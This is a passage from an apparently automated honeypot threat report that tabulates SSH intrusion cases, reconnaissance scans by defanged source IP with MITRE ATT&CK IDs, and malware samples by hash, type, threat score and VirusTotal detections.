| IR-80f2935f95df | HIGH | `202.46.28[.]140` | 2026-10-13 12:51 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0bdbcecc6a53 | HIGH | `202.46.28[.]140` | 2026-10-13 12:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-94819ac843ab | HIGH | `223.17.1[.]118` | 2026-10-13 12:52 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2adfa4b64387 | HIGH | `223.17.1[.]118` | 2026-10-13 12:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b672dc7b5f2b | HIGH | `157.245.244[.]221` | 2026-10-13 12:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fb20a6ac304e | HIGH | `157.245.244[.]221` | 2026-10-13 12:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b09f3c7d159c | HIGH | `101.36.119[.]203` | 2026-10-13 12:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9c301de5c8f4 | HIGH | `101.36.119[.]203` | 2026-10-13 12:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b992d16275f4 | HIGH | `163.7.3[.]26` | 2026-10-13 12:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e762a0195334 | HIGH | `183.56.196[.]185` | 2026-10-13 12:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-62a43c0ca056 | HIGH | `163.7.3[.]26` | 2026-10-13 12:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5a17e2984432 | HIGH | `50.114.236[.]21` | 2026-10-13 12:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-54f03ef7b6e8 | HIGH | `50.114.236[.]21` | 2026-10-13 12:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-539b06c0df5c | HIGH | `165.232.174[.]146` | 2026-10-13 13:14 | Y | 1 | 0 | `T1078 · T1592` |
| IR-a0ad5b1827d3 | HIGH | `124.225.4[.]88` | 2026-10-13 13:15 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-7eaa37a598e7 | HIGH | `183.82.111[.]224` | 2026-10-13 14:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-88bf97fea090 | HIGH | `183.82.111[.]224` | 2026-10-13 14:50 | Y | 0 | 0 | `T1078 · T1592` |
_… 26 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.19.117[.]129` | **7** | 2026-10-13 03:48 | 2026-10-13 14:43 | 1m | 14 | `T1110.001 · T1592` | 🟢 LOW |
| `132.148.30[.]167` | **3** | 2026-10-13 09:34 | 2026-10-13 13:17 | 2m | 0 | `T1592` | 🟢 LOW |
| `121.142.204[.]4` | **2** | 2026-10-13 05:00 | 2026-10-13 06:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-13 03:10 | 2026-10-13 04:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-13 12:15 | 2026-10-13 14:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `179.43.153[.]10` | **2** | 2026-10-13 05:36 | 2026-10-13 07:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | **2** | 2026-10-13 09:21 | 2026-10-13 10:08 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]50` | **2** | 2026-10-13 05:13 | 2026-10-13 06:16 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `103.203.57[.]19` | 1 | 2026-10-13 11:34 | 2026-10-13 11:34 | 5s | 0 | `T1592` | 🟢 LOW |
| `103.203.59[.]9` | 1 | 2026-10-13 03:41 | 2026-10-13 03:41 | 10s | 0 | `T1592` | 🟢 LOW |
| `103.211.76[.]8` | 1 | 2026-10-13 07:26 | 2026-10-13 07:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.248.130[.]88` | 1 | 2026-10-13 13:31 | 2026-10-13 13:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.248.243[.]121` | 1 | 2026-10-13 12:04 | 2026-10-13 12:04 | 20s | 0 | `T1592` | 🟢 LOW |
| `104.250.184[.]80` | 1 | 2026-10-13 14:39 | 2026-10-13 14:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.15.236[.]209` | 1 | 2026-10-13 04:04 | 2026-10-13 04:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `107.214.109[.]244` | 1 | 2026-10-13 07:33 | 2026-10-13 07:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]139` | 1 | 2026-10-13 10:00 | 2026-10-13 10:00 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]143` | 1 | 2026-10-13 05:51 | 2026-10-13 05:51 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]154` | 1 | 2026-10-13 09:36 | 2026-10-13 09:36 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]162` | 1 | 2026-10-13 09:03 | 2026-10-13 09:03 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]165` | 1 | 2026-10-13 11:04 | 2026-10-13 11:04 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]169` | 1 | 2026-10-13 06:41 | 2026-10-13 06:41 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]44` | 1 | 2026-10-13 03:48 | 2026-10-13 03:48 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]48` | 1 | 2026-10-13 04:02 | 2026-10-13 04:02 | 8s | 0 | `T1592` | 🟢 LOW |
| `111.17.199[.]57` | 1 | 2026-10-13 03:26 | 2026-10-13 03:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.175.88[.]6` | 1 | 2026-10-13 10:47 | 2026-10-13 10:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `112.163.135[.]28` | 1 | 2026-10-13 06:41 | 2026-10-13 06:41 | 20s | 0 | `T1592` | 🟢 LOW |
| `112.168.176[.]15` | 1 | 2026-10-13 05:30 | 2026-10-13 05:31 | 18s | 0 | `T1592` | 🟢 LOW |
| `113.75.25[.]30` | 1 | 2026-10-13 16:53 | 2026-10-13 16:53 | 23s | 0 | `T1592` | 🟢 LOW |
| `117.50.44[.]85` | 1 | 2026-10-13 12:54 | 2026-10-13 12:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.114[.]113` | 1 | 2026-10-13 06:51 | 2026-10-13 06:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.86[.]5` | 1 | 2026-10-13 05:08 | 2026-10-13 05:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.35.190[.]116` | 1 | 2026-10-13 07:54 | 2026-10-13 07:55 | 25s | 0 | `T1592` | 🟢 LOW |
| `118.47.81[.]207` | 1 | 2026-10-13 03:23 | 2026-10-13 03:24 | 29s | 0 | `T1592` | 🟢 LOW |
| `119.204.110[.]221` | 1 | 2026-10-13 09:46 | 2026-10-13 09:46 | 19s | 0 | `T1592` | 🟢 LOW |
| `119.237.32[.]122` | 1 | 2026-10-13 13:11 | 2026-10-13 13:11 | 16s | 0 | `T1592` | 🟢 LOW |
| `119.93.221[.]255` | 1 | 2026-10-13 02:59 | 2026-10-13 02:59 | 30s | 0 | `T1592` | 🟢 LOW |
| `120.26.202[.]34` | 1 | 2026-10-13 09:31 | 2026-10-13 09:31 | 5s | 0 | `T1592` | 🟢 LOW |
| `120.48.110[.]204` | 1 | 2026-10-13 05:56 | 2026-10-13 05:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.150.234[.]205` | 1 | 2026-10-13 08:51 | 2026-10-13 08:51 | 22s | 0 | `T1592` | 🟢 LOW |
| `122.13.25[.]186` | 1 | 2026-10-13 05:23 | 2026-10-13 05:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.59.7[.]18` | 1 | 2026-10-13 09:36 | 2026-10-13 09:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.129.1[.]253` | 1 | 2026-10-13 14:07 | 2026-10-13 14:08 | 21s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-13 16:13 | 2026-10-13 16:13 | 4s | 0 | `T1592` | 🟢 LOW |
| `134.209.147[.]61` | 1 | 2026-10-13 06:46 | 2026-10-13 06:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-13 06:05 | 2026-10-13 06:05 | 1s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-13 08:08 | 2026-10-13 08:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-13 10:11 | 2026-10-13 10:11 | 1s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-13 16:15 | 2026-10-13 16:15 | 1s | 0 | `T1592` | 🟢 LOW |
| `139.59.151[.]17` | 1 | 2026-10-13 12:04 | 2026-10-13 12:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.126[.]104` | 1 | 2026-10-13 15:03 | 2026-10-13 15:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.50.1[.]151` | 1 | 2026-10-13 16:35 | 2026-10-13 16:35 | 16s | 0 | `T1592` | 🟢 LOW |
| `148.222.194[.]90` | 1 | 2026-10-13 12:25 | 2026-10-13 12:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `157.230.119[.]196` | 1 | 2026-10-13 12:02 | 2026-10-13 12:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `164.90.239[.]35` | 1 | 2026-10-13 12:04 | 2026-10-13 12:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.154.225[.]20` | 1 | 2026-10-13 02:59 | 2026-10-13 02:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.232.174[.]146` | 1 | 2026-10-13 13:14 | 2026-10-13 13:14 | 4s | 0 | `T1592` | 🟢 LOW |
| `169.212.149[.]252` | 1 | 2026-10-13 12:30 | 2026-10-13 12:30 | 16s | 0 | `T1592` | 🟢 LOW |
| `176.99.112[.]253` | 1 | 2026-10-13 14:12 | 2026-10-13 14:12 | 26s | 0 | `T1592` | 🟢 LOW |
| `178.132.198[.]200` | 1 | 2026-10-13 06:39 | 2026-10-13 06:40 | 16s | 0 | `T1592` | 🟢 LOW |
| `179.43.153[.]10` | 1 | 2026-10-13 10:26 | 2026-10-13 10:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `181.43.156[.]188` | 1 | 2026-10-13 07:39 | 2026-10-13 07:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.43.71[.]198` | 1 | 2026-10-13 16:24 | 2026-10-13 16:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.104.212[.]232` | 1 | 2026-10-13 05:23 | 2026-10-13 05:23 | 23s | 0 | `T1592` | 🟢 LOW |
| `183.99.28[.]101` | 1 | 2026-10-13 05:51 | 2026-10-13 05:51 | 12s | 0 | `T1592` | 🟢 LOW |
| `184.105.139[.]69` | 1 | 2026-10-13 09:11 | 2026-10-13 09:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `184.105.247[.]195` | 1 | 2026-10-13 06:37 | 2026-10-13 06:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `184.82.31[.]228` | 1 | 2026-10-13 04:22 | 2026-10-13 04:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.151.86[.]51` | 1 | 2026-10-13 06:32 | 2026-10-13 06:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.9.139[.]102` | 1 | 2026-10-13 08:34 | 2026-10-13 08:34 | 18s | 0 | `T1592` | 🟢 LOW |
| `185.9.184[.]157` | 1 | 2026-10-13 15:35 | 2026-10-13 15:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `187.62.243[.]142` | 1 | 2026-10-13 16:29 | 2026-10-13 16:29 | 23s | 0 | `T1592` | 🟢 LOW |
| `190.106.105[.]107` | 1 | 2026-10-13 04:08 | 2026-10-13 04:08 | 13s | 0 | `T1592` | 🟢 LOW |
| `190.113.188[.]212` | 1 | 2026-10-13 16:18 | 2026-10-13 16:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-13 03:28 | 2026-10-13 03:28 | 2s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]158` | 1 | 2026-10-13 07:40 | 2026-10-13 07:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]84` | 1 | 2026-10-13 06:59 | 2026-10-13 06:59 | 25s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.65.219[.]154` | 1 | 2026-10-13 04:40 | 2026-10-13 04:41 | 9s | 0 | `T1592` | 🟢 LOW |
| `203.186.234[.]217` | 1 | 2026-10-13 09:27 | 2026-10-13 09:28 | 18s | 0 | `T1592` | 🟢 LOW |
| `203.195.82[.]138` | 1 | 2026-10-13 12:18 | 2026-10-13 12:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `203.6.235[.]51` | 1 | 2026-10-13 09:36 | 2026-10-13 09:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `210.223.251[.]2` | 1 | 2026-10-13 16:17 | 2026-10-13 16:17 | 21s | 0 | `T1592` | 🟢 LOW |
| `211.105.71[.]4` | 1 | 2026-10-13 03:51 | 2026-10-13 03:51 | 19s | 0 | `T1592` | 🟢 LOW |
| `211.226.39[.]4` | 1 | 2026-10-13 16:26 | 2026-10-13 16:26 | 28s | 0 | `T1592` | 🟢 LOW |
| `217.113.18[.]66` | 1 | 2026-10-13 06:40 | 2026-10-13 06:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `217.146.80[.]117` | 1 | 2026-10-13 07:41 | 2026-10-13 07:41 | 10s | 0 | `T1592` | 🟢 LOW |
| `220.134.17[.]184` | 1 | 2026-10-13 08:47 | 2026-10-13 08:47 | 30s | 0 | `T1592` | 🟢 LOW |
| `220.93.200[.]5` | 1 | 2026-10-13 09:40 | 2026-10-13 09:40 | 23s | 0 | `T1592` | 🟢 LOW |
| `221.144.221[.]177` | 1 | 2026-10-13 06:21 | 2026-10-13 06:22 | 17s | 0 | `T1592` | 🟢 LOW |
| `221.144.221[.]177` | 1 | 2026-10-13 12:00 | 2026-10-13 12:01 | 17s | 0 | `T1592` | 🟢 LOW |
| `222.113.196[.]55` | 1 | 2026-10-13 14:00 | 2026-10-13 14:01 | 24s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-10-13 04:53 | 2026-10-13 04:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.202.9[.]133` | 1 | 2026-10-13 10:17 | 2026-10-13 10:17 | 40s | 0 | `T1592` | 🟢 LOW |
| `36.137.249[.]148` | 1 | 2026-10-13 15:32 | 2026-10-13 15:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.140.151[.]122` | 1 | 2026-10-13 05:18 | 2026-10-13 05:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `37.112.175[.]173` | 1 | 2026-10-13 06:47 | 2026-10-13 06:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-10-13 07:06 | 2026-10-13 07:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-10-13 16:06 | 2026-10-13 16:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-10-13 12:39 | 2026-10-13 12:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.248.33[.]200` | 1 | 2026-10-13 12:41 | 2026-10-13 12:41 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | 1 | 2026-10-13 07:36 | 2026-10-13 07:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-10-13 06:38 | 2026-10-13 06:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]251` | 1 | 2026-10-13 06:52 | 2026-10-13 06:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]129` | 1 | 2026-10-13 06:38 | 2026-10-13 06:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]129` | 1 | 2026-10-13 13:35 | 2026-10-13 13:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.5[.]11` | 1 | 2026-10-13 03:41 | 2026-10-13 03:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.136.6[.]169` | 1 | 2026-10-13 11:27 | 2026-10-13 11:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `47.101.137[.]46` | 1 | 2026-10-13 09:13 | 2026-10-13 09:13 | 8s | 0 | `T1592` | 🟢 LOW |
| `5.94.201[.]66` | 1 | 2026-10-13 16:28 | 2026-10-13 16:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `52.165.89[.]155` | 1 | 2026-10-13 03:30 | 2026-10-13 03:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.153.69[.]64` | 1 | 2026-10-13 05:45 | 2026-10-13 05:45 | 16s | 0 | `T1592` | 🟢 LOW |
| `58.177.47[.]66` | 1 | 2026-10-13 09:35 | 2026-10-13 09:35 | 17s | 0 | `T1592` | 🟢 LOW |
| `58.56.204[.]118` | 1 | 2026-10-13 16:24 | 2026-10-13 16:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.21.181[.]38` | 1 | 2026-10-13 16:16 | 2026-10-13 16:17 | 18s | 0 | `T1592` | 🟢 LOW |
| `59.23.126[.]178` | 1 | 2026-10-13 13:45 | 2026-10-13 13:45 | 30s | 0 | `T1592` | 🟢 LOW |
| `59.27.255[.]168` | 1 | 2026-10-13 11:07 | 2026-10-13 11:07 | 16s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]253` | 1 | 2026-10-13 10:04 | 2026-10-13 10:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.225.78[.]34` | 1 | 2026-10-13 05:14 | 2026-10-13 05:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]122` | 1 | 2026-10-13 03:06 | 2026-10-13 03:06 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]134` | 1 | 2026-10-13 03:55 | 2026-10-13 03:55 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]32` | 1 | 2026-10-13 05:30 | 2026-10-13 05:30 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]140` | 1 | 2026-10-13 12:37 | 2026-10-13 12:37 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]113` | 1 | 2026-10-13 12:38 | 2026-10-13 12:38 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]57` | 1 | 2026-10-13 12:37 | 2026-10-13 12:37 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]88` | 1 | 2026-10-13 16:29 | 2026-10-13 16:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-10-13 05:36 | 2026-10-13 05:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-10-13 08:36 | 2026-10-13 08:36 | 10s | 0 | `T1592` | 🟢 LOW |
| `70.51.29[.]92` | 1 | 2026-10-13 03:48 | 2026-10-13 03:48 | 14s | 0 | `T1592` | 🟢 LOW |
| `71.6.199[.]65` | 1 | 2026-10-13 04:40 | 2026-10-13 04:40 | 10s | 0 | `T1592` | 🟢 LOW |
| `71.70.17[.]87` | 1 | 2026-10-13 02:57 | 2026-10-13 02:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.90.30[.]53` | 1 | 2026-10-13 07:03 | 2026-10-13 07:03 | 31s | 0 | `T1592` | 🟢 LOW |
| `73.24.202[.]63` | 1 | 2026-10-13 13:25 | 2026-10-13 13:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `74.249.130[.]208` | 1 | 2026-10-13 14:52 | 2026-10-13 14:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `74.249.178[.]45` | 1 | 2026-10-13 15:10 | 2026-10-13 15:10 | 10s | 0 | `T1592` | 🟢 LOW |
| `76.36.132[.]13` | 1 | 2026-10-13 03:53 | 2026-10-13 03:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-13 05:58 | 2026-10-13 05:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-13 09:15 | 2026-10-13 09:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-10-13 08:07 | 2026-10-13 08:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.92.226[.]112` | 1 | 2026-10-13 10:00 | 2026-10-13 10:01 | 21s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | 1 | 2026-10-13 16:29 | 2026-10-13 16:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]98` | 1 | 2026-10-13 07:56 | 2026-10-13 07:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `84.54.70[.]125` | 1 | 2026-10-13 12:32 | 2026-10-13 12:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]12` | 1 | 2026-10-13 07:35 | 2026-10-13 07:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]30` | 1 | 2026-10-13 07:32 | 2026-10-13 07:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]12` | 1 | 2026-10-13 07:15 | 2026-10-13 07:16 | 31s | 0 | `T1592` | 🟢 LOW |
| `89.37.172[.]147` | 1 | 2026-10-13 07:57 | 2026-10-13 07:57 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
